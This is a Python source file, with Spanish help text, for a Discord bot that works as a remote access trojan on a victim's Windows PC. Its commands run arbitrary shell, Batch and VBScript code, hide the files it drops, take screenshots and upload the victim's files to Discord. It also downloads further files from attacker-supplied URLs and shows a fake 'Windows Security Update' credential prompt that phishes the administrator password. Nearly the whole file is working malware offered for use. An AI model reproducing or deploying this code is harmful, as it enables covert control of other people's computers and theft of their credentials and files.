import os
import discord 
from discord.ext import commands
import subprocess
import requests
import pyautogui


#######################

prefix = '!' # PUEDES CAMBIAR EL PREFIX
token = 'BOT_TOKEN' # BOT TOKEN AQUÍ
bot = commands.Bot(command_prefix=prefix)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
cmds=f"""
Comandos disponibles y su función:

`{prefix}cmd <ARGUMENTOS>` : Ejecuta un comando en la consola de la victima. 
`(Ejemplo: {prefix}cmd ping google.com)`

`{prefix}batinjector <ARGUMENTOS>` : Inyecta code Batch en la PC de la victima.

`{prefix}vbsinjector <ARGUMENTOS>` : Inyecta code VBS en la PC de la victima.

`{prefix}screenshot` : Obtén una captura de pantalla del PC de la victima.

`{prefix}ufile <Nombre Archivo>` : Sube un archivo de la victima 
(Peso máximo 8mb en servidores de nivel 1, si tu server es Nivel 2 puedes 50mb o Nivel 3 con 100mb)

`{prefix}dfile <URL ARCHIVO> <RUTA EN DONDE SE GUARDARÁ>` : Descarga un archivo en el PC de la victima.

`{prefix}cd <Ruta>` : Muevete por las carpetas del PC de la victima 
(Esto es recomendado en caso de que busques un archivo y lo quieras subir con `{prefix}ufile`)

`{prefix}windowspass` : Genera una ventana realista para la victima para que esta ingrese las credenciales de su sesión (Esto para obtener la contraseña y usuario ADMINISTRADOR)

`{prefix}whoami` : Obtén información sobre el PC en el que se ejecutó el archivo. 
"""
####################################################################
@bot.event
async def on_ready():
    print(f'{bot.user} ON!')
# Comandos:
####################################################################
@bot.command()
async def ayuda(message):

    embed=discord.Embed(
            title="Comandos y Ayuda", 
            description=cmds,
            color=0xFF5733,
            ).set_footer(text='Made by ; phoenix.3301 (ID: 1165315969254707211)')
    await message.reply(embed=embed)
####################################################################
@bot.command()
async def whoami(message):
    ip = requests.get('https://api.ipify.org').text
    def whoami():
        output = subprocess.run('whoami', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return output 
    whoami2 = str(whoami().stdout.decode('CP437'))
    await message.reply(f'**Se ejecutó el archivo en la computadora:** {whoami2} (IP PÚBLICA: {ip})')
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
####################################################################    
@bot.command()
async def cmd(message, *, args=None):
        if args == None: 
            return await message.reply(f'**Debes colocar un comando para ejecutar en la consola de la victima.**\n Ejemplo: `{prefix}cmd <Argumentos [Comando]>`')
        command =  args
        def shell():
            output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output 
            
        result = str(shell().stdout.decode('CP437'))
        numb = len(result)
        if numb < 1: return await message.reply('**Comando ejecutado correctamente pero... No se encontró ningún comando o no salió nada de la consola.**')
        if len(result) > 2000:
            file = open('2000.txt', 'a')
            file.write(result)
            file.close()
            os.system('attrib +h "2000.txt"')
            filebuffer = discord.File("2000.txt", filename="2000.txt")
            await message.reply(f'**Comando inyectado correctamente!**\n **Output:**', file=filebuffer)
            os.remove('2000.txt')
        else:
            await message.reply(f'**Comando injectado correctamente!**\n ```\nComando Output: {result}```')
####################################################################
@bot.command()
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
async def cd(message, *, args=None):
    if args == None: return message.reply(f'**Debes colocar la ruta a la que deseas moverte.**\n ```\n ')
    try:
        os.chdir(args)
        output = subprocess.run('dir', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = str(output.stdout.decode('CP437'))
        if len(result) > 2000:
            file = open('2000.txt','a')
            file.write(result)
            file.close()
            filebuffer = discord.File('2000.txt',filename='2000.txt')
            await message.reply('**Comando ejecutado correctamente:**\n**Output:**\n', file=filebuffer)
        else:
            await message.reply(f'**Comando ejecutado correctamente:**\n ```\n Console Output:\n {result}```')
    except os.error as err:
        await message.reply(f'**Ocurrió un error al intentar acceder a la ruta:**\n```\nConsole Log:\n{err}```')

####################################################################
@bot.command()
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
async def windowspass(message, *,args=None):

    import subprocess
    

    
    log = "$cred=$host.ui.promptforcredential('Windows Security Update','Windows ha recibido una actualización de seguridad. Por favor, introduzca su nombre de usuario y contraseña para continuar usando su dispositivo.',[Environment]::UserName,[Environment]::UserDomainName);"
    username = 'echo **Username:** $cred.getnetworkcredential().username;'
    password = 'echo **Contraseña:** $cred.getnetworkcredential().password;'
    command = 'Powershell "{} {} {}"'.format(log,username,password)


    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    result = str(output.stdout.decode('CP437'))
    if not result:
        os.system('powershell (New-Object -ComObject Wscript.Shell).Popup("""Debes introducir las credenciales.""",0,"""Windows Security Update: ERROR""",0x30)')
        output2 = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result2 = str(output2.stdout.decode('CP437'))
        if not result2:
            os.system('powershell (New-Object -ComObject Wscript.Shell).Popup("""Has cancelado esta medida de seguridad, por lo que deberás tener en cuenta de que podrías estar expuesto a vulnerabilidades criticas del sistema.""",0,"""Se ha cancelado esta acción.""",0x10)')

            os.system('rundll32.exe user32.dll, LockWorkStation')
            await message.reply(f"**Se inyectó el exploit para obtener la contraseña correctamente, pero la victima no escribió nada.**")
        await message.reply(f"**Se inyectó el exploit para obtener la contraseña correctamente!**\nResultado:\n---------------------------------------------\n{result2}")
    else:
        await message.reply(f"**Se inyectó el exploit para obtener la contraseña correctamente!**\nResultado:\n---------------------------------------------\n{result}")
####################################################################
@bot.command()
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
async def screenshot(message):

        try:
            captura = pyautogui.screenshot()
            captura.save('ss.png')
            os.system('attrib +h "ss.png"')
            ss = discord.File('ss.png', filename='ss.png')
            await message.reply(f'**Screenshot tomado correctamente:**', file=ss)
            os.remove('ss.png')
        except os.error as err:
            await message.reply('**Ocurrió un error, intentalo de nuevo.**')
    
####################################################################


@bot.command()   
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
async def batinjector(message, *,args=None):

    
    if args == None: 
        return await message.reply(f'**Debes colocar el Batch Code para inyectar en la PC de la victima.**\n Ejemplo:\n```\n{prefix}batinjector <Argumentos [Batch Code]>\n Ejemplo de uso:\n\n{prefix}batinjector @echo off\nstart https://youtube.com```')
    else:
        code =  args
        
        file = open('i.bat','a')
        file.write(code)
        file.close()
        os.system('attrib +h "i.bat"')

        def shell():
            output = subprocess.run('i.bat', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            return output
        coutput = str(shell().stdout.decode('CP437'))

        if len(coutput) > 2000:
            file2 = open('2000.txt','a')
            file2.write(coutput)
            file.close()
            os.system('attrib +h "2000.txt"')
            filebuffer = discord.File('2000.txt', filename='2000.txt')
            await message.reply(f'**Bat inyectado correctamente.**\n **Console Output:**', file=filebuffer)
            os.remove('2000.txt')
            os.remove('i.bat')
        else:
            await message.reply(f'**Bat inyectado correctamente.**\n ```\nConsole Output:\n {coutput}```')
            os.remove('i.bat')
####################################################################
@bot.command()   
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
async def vbsinjector(message, *,args=None):


    
    if args == None: 
        return await message.reply(f'**Debes colocar el Batch Code para inyectar en la PC de la victima.**\n Ejemplo:\n```\n{prefix}vbsinjector <Argumentos [VBScript Code]>\n Ejemplo de uso:\n\n{prefix}vbsinjector\nx=msgbox("You got hacked lol" ,0, "You are Hacked JIJIJA")```')
    else:
        code =  args
        
        file = open('i.vbs','a')
        file.write(code)
        file.close()
        os.system('attrib +h "i.vbs"')

        def shell():
            output = subprocess.run('i.vbs', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            return output
        coutput = str(shell().stdout.decode('CP437'))

        if len(coutput) > 2000:
            file2 = open('2000.txt','a')
            file2.write(coutput)
            file.close()
            os.system('attrib +h "2000.txt"')
            filebuffer = discord.File('2000.txt', filename='2000.txt')
            await message.reply(f'**VBScript inyectado correctamente.**\n **Console Output:**', file=filebuffer)
            os.remove('2000.txt')
            os.remove('i.vbs')
        else:
            await message.reply(f'**VBScript inyectado correctamente.**\n ```\nConsole Output:\n {coutput}```')
            os.remove('i.vbs')
############################################################
@bot.command()
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
async def ufile(message, *, args=None):
    if args == None: 
        return await message.reply(f'**Debes colocar el nombre del archivo que quieres obtener.**\n (Este no debe pesar arriba de 8mb (LIMITE DE DISCORD PARA SERVIDORES LVL 1))\n Puedes usar el comando: `{prefix}cd /RUTA` para moverte en los archivos de la victima.')
    else:
        filebuffer = discord.File(f'./{args}', filename=args)
        await message.reply('**Comando inyectado correctamente, aquí está el archivo:**', file=filebuffer)
############################################################
@bot.command()
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
async def dfile(message, args1=None, args2=None):
    if args1 == None:
        return await message.reply(f'**Debes colocar la URL del archivo que deseas que la computadora infectada lo descargue.**\nEjemplo: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`\n (Nota: Como recomendación usa el comando: `{prefix}cd /RUTA` para moverte entre los archivos de la victima a uno más escondido para que al descargar el archivo no sea visible para la victima.)')
    if args2 == None:
        return await message.reply(f'**Debes colocar la ruta y el nombre con extensión del archivo para guardarlo.**\n Ejemplo: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`')
    if not args1.startswith('http'): return message.reply(f'**Debes colocar la URL del archivo que deseas que la computadora infectada lo descargue.**\nEjemplo: `{prefix}dfile <https://archivo-200mb.zip> <zipfile.zip>`\n (Nota: Como recomendación usa el comando: `{prefix}cd /RUTA` para moverte entre los archivos de la victima a uno más escondido para que al descargar el archivo no sea visible para la victima.)')
    os.system(f'Powershell Invoke-WebRequest {args1} -OutFile {args2}')
    await message.reply('**Se descargó el archivo correctamente.**')



############################################################
bot.run(token) # Bot Login
############################################################    
 
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)
# MADE BY ; phoenix.3301 (ID: 1165315969254707211)

